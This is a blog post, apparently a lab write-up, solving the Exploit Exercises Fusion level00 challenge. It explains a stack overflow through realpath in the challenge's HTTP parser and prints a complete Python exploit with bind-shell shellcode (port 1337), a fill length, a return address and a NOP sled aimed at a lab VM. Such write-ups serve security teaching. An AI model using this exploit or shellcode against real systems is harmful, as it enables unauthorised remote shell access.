<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Exploit Exercises - Fusion Level00 &#8211; A Little (1 << 3) + y</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Poping a shell on the first Fusion challenge">
    <meta name="author" content="Chris">
    <meta name="keywords" content="wargames, fusion, exploit-exercises">
    <link rel="canonical" href="http://localhost:4000/wargames/fusion/exploit-exercises/2015/01/20/fusion/">
    <link rel="alternate" type="application/rss+xml" title="RSS Feed for A Little (1 << 3) + y" href="/feed.xml" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/pixyll.css?201807100044" type="text/css">
    <link rel="stylesheet" href="/css/prism.css?201807100044" type="text/css">

    <!-- Fonts -->
    <link href='//fonts.googleapis.com/css?family=Merriweather:900,900italic,300,300italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Lato:900,300' rel='stylesheet' type='text/css'>
    
      <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
    


    <!-- Open Graph -->
    <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Exploit Exercises - Fusion Level00">
    <meta property="og:description" content="Blades out like Wolverine, but it was all a huge act man. ~ octobersveryown">
    <meta property="og:url" content="http://localhost:4000/wargames/fusion/exploit-exercises/2015/01/20/fusion/">
    <meta property="og:site_name" content="A Little (1 &lt;&lt; 3) + y">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    
        <meta name="twitter:site" content="@breadchris" />
    
    <meta name="twitter:title" content="Exploit Exercises - Fusion Level00" />
    <meta name="twitter:description" content="Poping a shell on the first Fusion challenge" />
    <meta name="twitter:url" content="http://localhost:4000/wargames/fusion/exploit-exercises/2015/01/20/fusion/" />

    <!-- Icons -->
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="/favicon-192x192.png" sizes="192x12">
    <link rel="icon" type="image/png" href="/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
        
    
</head>

<body class="site">
  <div class="site-wrap">
    <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="http://localhost:4000" class="site-title">A Little (1 << 3) + y</a>
      <nav class="site-nav">
        <a href="/about/">About</a>
<a href="/contact/">Contact</a>

      </nav>
      <div class="clearfix"></div>
      
        <div class="social-icons">
  <div class="left">
    
      <a class="fa fa-github" href="https://github.com/breadchris"></a>
    
    
    <a class="fa fa-rss" href="/feed.xml"></a>
    
      <a class="fa fa-twitter" href="https://twitter.com/breadchris"></a>
    
    
    
    
    
  </div>
  <div class="right">
    
    
    
  </div>
</div>
<div class="clearfix"></div>

      
    </div>
  </div>
</header>


    <div class="post p2 p-responsive wrap" role="main">
      <div class="measure">
        


<div class="post-header mb2">
  <h1>Exploit Exercises - Fusion Level00</h1>
  <span class="post-meta">Jan 20, 2015</span><br>
    
  <span class="post-meta small">
  
    5 minute read
  
  </span>
</div>

<article class="post-content">
  <p>This challenge is pretty much a straight forward stack overflow where you are using the fact that when we call real_path:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">fix_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">resolved</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
  
  <span class="k">if</span><span class="p">(</span><span class="n">realpath</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">resolved</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// can't access path. will error trying to open
</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">resolved</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>our <code class="highlighter-rouge">path</code> variable’s size is controlled by our initial read in <code class="highlighter-rouge">parse_http_request</code>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">path</span><span class="p">;</span>
  <span class="p">...</span>
  <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"Failed to read from remote host"</span><span class="p">);</span>
  <span class="p">...</span>
  <span class="n">path</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="p">...</span>
  <span class="n">fix_path</span><span class="p">(</span><span class="n">path</span><span class="p">);</span></code></pre></figure>

<p>as our <code class="highlighter-rouge">path</code> variable is simply a pointer to a location in <code class="highlighter-rouge">buffer</code> 4 bytes in. So looking up what <code class="highlighter-rouge">realpath</code> <a title="Realpath" href="http://man7.org/linux/man-pages/man3/realpath.3.html" target="_blank">does</a> we find that it will copy the given <code class="highlighter-rouge">path</code> string to our <code class="highlighter-rouge">resolved</code> buffer expanding any relative paths that we might have. <code class="highlighter-rouge">realpath</code> will also make sure that the file actually exists and if it doesn’t it will return <code class="highlighter-rouge">NULL</code>. So for our sake we really don’t care if we can access the <code class="highlighter-rouge">strcpy</code> because <code class="highlighter-rouge">realpath</code> will do the same thing for us!</p>

<p>So now that we know what we are targeting, we need to make sure we pass the earlier checks to actually get to this point.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="p">...</span>
  <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"GET "</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"Not a GET request"</span><span class="p">);</span> <span class="c1">// Is "GET " the first part of the given string?
</span>
  <span class="n">path</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sc">' '</span><span class="p">);</span> <span class="c1">// After the "GET " string, is there another space?
</span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">q</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"No protocol version specified"</span><span class="p">);</span> <span class="c1">// If not, throw an error
</span>  <span class="o">*</span><span class="n">q</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Replace the space with a NULL character so we separate the path and protocol
</span>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="s">"HTTP/1.1"</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"Invalid protocol"</span><span class="p">);</span> <span class="c1">// Is the protocol == "HTTP/1.1"?
</span>  <span class="p">...</span></code></pre></figure>

<p>So from this we can deduce our payload is going to be something in the form of <code class="highlighter-rouge">GET &lt;fill buffer&gt;&lt;return address&gt;; HTTP/1.1&lt;nop sled&gt;&lt;shellcode&gt;;</code>. You can stick your shellcode in the nop sled but it is up to you :D Since we want $eip to point to our shellcode located some number of bytes away from the start of our buffer, we can start with using the buffer address that get leaked to us by the program and add some offset to get to our nop sled (the nop sled is optional here since we can really just calculate the exact offset but I was too lazy lol). Wiht some playing around in the binary you can find number of bogus characters to fill the buffer to be 139, after the 139th character, you will begin to overwrite the return address :D. Thus we would want our return address would be: buffer address + 139 + a few more to make sure we go past the return address that we stuck in there and onto the nop sled. Putting it all together we get:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">os.path</span> <span class="kn">import</span> <span class="n">expanduser</span>
<span class="n">home</span> <span class="o">=</span> <span class="n">expanduser</span><span class="p">(</span><span class="s">"~"</span><span class="p">)</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">home</span> <span class="o">+</span> <span class="s">"/Template"</span><span class="p">)</span>
<span class="kn">from</span> <span class="nn">isis</span> <span class="kn">import</span> <span class="o">*</span>


<span class="c">#Allow time to attach debugger</span>
<span class="n">debug</span> <span class="o">=</span> <span class="bp">True</span>
<span class="c">#change for local vs remote exploit</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">"172.16.76.131"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">20000</span>

<span class="c">#set up connection and set timeout </span>
<span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">get_socket</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mh">0x1000000</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">s</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">connect</span><span class="p">()</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
	<span class="nb">raw_input</span><span class="p">(</span><span class="s">"?"</span><span class="p">)</span>

<span class="c"># Shell Bind TCP Shellcode Port 1337 - 89 bytes - http://shell-storm.org/shellcode/files/shellcode-882.php</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80</span><span class="s">"</span>


<span class="n">fill_buff</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">139</span> <span class="o">+</span> <span class="n">lei</span><span class="p">(</span><span class="mh">0xbffff8f8</span> <span class="o">+</span> <span class="mi">170</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"GET "</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">fill_buff</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">" HTTP/1.1"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">32</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	
<span class="c"># keeps connection open</span>
<span class="n">telnet_shell</span><span class="p">(</span><span class="n">s</span><span class="p">)</span></code></pre></figure>

<p>We then have a shell listening on port 1337 that we can nc into :D</p>

<p>(I used a collection of helper functions from Blankwall’s Template library. I encourage you to check it out: (<a href="https://github.com/blankwall/Template">Github</a>)</p>

</article>









      </div>
    </div>
  </div>

  <footer class="center">
  <div class="measure">
    <small>
      Thank you for reading dear reader, and good night...<br />
      Blog made with &lt;3 by Breadchris<br />
      Theme crafted with &lt;3 by <a href="http://johnotander.com">John Otander</a> (<a href="https://twitter.com/4lpine">@4lpine</a>).
    </small>
  </div>
</footer>

</body>
</html>
